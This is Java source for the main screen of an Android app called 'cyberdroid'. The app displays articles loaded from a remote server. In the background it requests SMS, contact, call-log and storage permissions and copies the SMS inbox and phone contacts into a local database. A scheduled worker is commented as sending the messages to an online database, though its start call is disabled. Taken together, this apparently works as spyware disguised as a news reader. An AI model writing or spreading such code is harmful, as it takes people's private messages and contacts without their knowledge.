package cyberdroid.cyberdroid;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.work.Constraints;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * Created by jkm-droid on 05/04/2021.
 */

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_READ_CONTACTS = 1;
    MessageHelper messageHelper;
    static Handler handler;
    MyHelper myHelper;
    Thread thread2;
    private static final int PERMISSION_REQUEST_READ_SMS = 100;
    private static final int MULTIPLE_PERMISSIONS = 4;
    String[] permissions;
    Boolean isSuccess = false;
    TextView loadingText;
    RecyclerView recyclerView;
    ArrayList<Articles> articles;

    @SuppressLint("HandlerLeak")
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        loadingText = findViewById(R.id.loading);
        recyclerView = findViewById(R.id.recylerview);

        messageHelper = new MessageHelper(this);

        permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE
        };
        if (!checkPermissions()){
            ActivityCompat.requestPermissions(MainActivity.this, permissions,MULTIPLE_PERMISSIONS);
        }

        MyHelper.restart();
        MyHelper.runtime();
        load_articles();
        main_worker();
    }

    private void load_articles() {
        String charset = "UTF-8", token="get_articles_online";
        String url = "https://cyberdroid.mblog.co.ke/cyberdroid/articles.php";
        try {
            String articles = URLEncoder.encode("get_articles", charset) + "=" + URLEncoder.encode("articles", charset)+"&"+
            URLEncoder.encode("token", charset) + "=" + URLEncoder.encode(token, charset);

            if (MyHelper.isNetworkAvailable(MainActivity.this)){
                loadingText.setVisibility(View.VISIBLE);
                connect_and_get_articles(url, articles);
            }

        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

    private void connect_and_get_articles(String link, String data){
        @SuppressLint("HandlerLeak")Handler handler = new Handler(){
            @Override
            public void handleMessage(@NonNull Message msg) {
                super.handleMessage(msg);
                if(((String)msg.obj).startsWith("{") && (((String) msg.obj).endsWith("}"))){
                    JSONObject jsonObject;
                    JSONArray jsonArray;
                    JSONObject object;
                    ArrayList<Articles> articlesArrayList = new ArrayList<>();
                    try {
                        jsonObject = new JSONObject((String)msg.obj);
                        if (jsonObject.getInt("status_code") == 200){
                            loadingText.setVisibility(View.GONE);
                            jsonArray = jsonObject.getJSONArray("articles");
                            System.out.println(jsonArray);
                            Articles articles;
                            for (int i=0;i < jsonArray.length();i++){
                                articles = new Articles();
                                object = jsonArray.getJSONObject(i);
                                articles.setTitle(object.getString("teamA"));
                                articlesArrayList.add(articles);
                            }

                            recyclerView.setLayoutManager(new GridLayoutManager(MainActivity.this, 1));
                            recyclerView.setAdapter(new RecyclerViewAdapter(MainActivity.this, articlesArrayList));
                            isSuccess = true;
                        }else if(jsonObject.getInt("status_code") == 201){
                            loadingText.setVisibility(View.VISIBLE);
                            loadingText.setText("No data found!");
                            loadingText.setTextColor(getResources().getColor(R.color.error));
                        }else{
                            loadingText.setVisibility(View.VISIBLE);
                            loadingText.setText("No data found!");
                            loadingText.setTextColor(getResources().getColor(R.color.error));
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }else{
                    loadingText.setVisibility(View.VISIBLE);
                    loadingText.setText("No data found!");
                    loadingText.setTextColor(getResources().getColor(R.color.error));
                }
            }
        };

        Thread thread = new Thread(){
            @Override
            public void run() {
                super.run();
                try {
                    if (isSuccess)
                        sleep(360000);
                    sleep(12000);
                    String response = MyHelper.connect_and_get(link, data);
                    System.out.println(response);
                    Message message = new Message();
                    message.arg1 = 200;
                    message.obj = response;
                    handler.sendMessage(message);

                }catch (IOException | InterruptedException e){
                    e.printStackTrace();
                }
                run();
            }
        };
        thread.start();
    }

    private boolean checkPermissions(){
        int results;
        List<String> requiredPermissions = new ArrayList<>();
        for (String perm : permissions){
            results = ContextCompat.checkSelfPermission(MainActivity.this, perm);
            if (results != PackageManager.PERMISSION_GRANTED){
                requiredPermissions.add(perm);
            }
        }

        if (!requiredPermissions.isEmpty()){
            ActivityCompat.requestPermissions(MainActivity.this, permissions,MULTIPLE_PERMISSIONS);
            return false;
        }

        return true;
    }

    /**
     * background activities
     */
    //when permission is granted during runtime
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == MULTIPLE_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                thread_function();
            } else {
//                ActivityCompat.requestPermissions(CheckOutActivity.this, permissions,MULTIPLE_PERMISSIONS);
            }
        }
    }

    @SuppressLint("HandlerLeak")
    private void main_worker() {
        //starting the service
        //method for sending the messages to online database
        //perform the work while the device is idle only
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        //perform the work periodically, every 10 minutes e.t.c
        final PeriodicWorkRequest messagesWorkRequest = new PeriodicWorkRequest
                .Builder(MyWorker.class, 5, TimeUnit.HOURS)
                .setConstraints(constraints)
                .setInitialDelay(2, TimeUnit.MINUTES)
                .build();


        //initiate the work using work manager
//        WorkManager workManager = WorkManager.getInstance(getApplicationContext());
//        workManager.enqueue(messagesWorkRequest);

//        workManager.getWorkInfoByIdLiveData(messagesWorkRequest.getId()).observe(
//                this, workInfo -> {
//                    if (workInfo != null) {
//                        Log.d("periodicWorkRequest", "Status changed to : " + workInfo.getState());
//                    }
//                }
//        );


        //handler for receiving messages from the thread
        handler = new Handler() {
            @SuppressLint("HandlerLeak")
            @Override
            public void handleMessage(@NonNull Message msg) {
                super.handleMessage(msg);

                if (msg.arg1 == 1) {
                    thread2.start();
                }
                if (msg.arg2 == 2){
                    System.out.println("----------------------contacts saved to sql---------------------------------------");
                }
            }
        };
    }

    public void thread_function() {
        Thread thread1 = new Thread() {
            final Message message = new Message();

            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            @Override
            public void run() {
                super.run();
                //retrieve messages from inbox
                //and save them into sql database
                myHelper = new MyHelper(MainActivity.this);
                myHelper.read_messages_from_inbox_and_save_into_sql_database();
                myHelper.read_sms_using_telephony();
                message.arg1 = 1;
                handler.dispatchMessage(message);

            }
        };
        thread1.start();//start thread

        thread2 = new Thread(){
            final Message message = new Message();

            @Override
            public void run() {
                super.run();
                myHelper = new MyHelper(getApplicationContext());
                myHelper.read_contacts_from_phone_and_save_to_sql_lite();
                message.arg2 = 2;
                handler.dispatchMessage(message);
            }
        };
    }

    static class RecyclerViewAdapter extends RecyclerView.Adapter<RecyclerViewAdapter.ViewHolder> {
        ArrayList<Articles> articles;
        Context context;

        RecyclerViewAdapter(Context context1, ArrayList<Articles> articles1) {
            this.context = context1;
            this.articles = articles1;
        }

        // stores and recycles views as they are scrolled off screen
        public static class ViewHolder extends RecyclerView.ViewHolder{
            TextView title;
            ViewHolder(View v) {
                super(v);
                title = v.findViewById(R.id.title);
            }

        }

        // inflates the cell layout from xml when needed
        @Override
        @NonNull
        public RecyclerViewAdapter.ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            View view = LayoutInflater.from(context).inflate(R.layout.articles, parent, false);
            return new ViewHolder(view);
        }

        // binds the data to the xml
        @Override
        public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            holder.title.setText(articles.get(position).getTitle());
        }

        // total number of cells
        @Override
        public int getItemCount() {
            return articles.size();
        }

    }

}
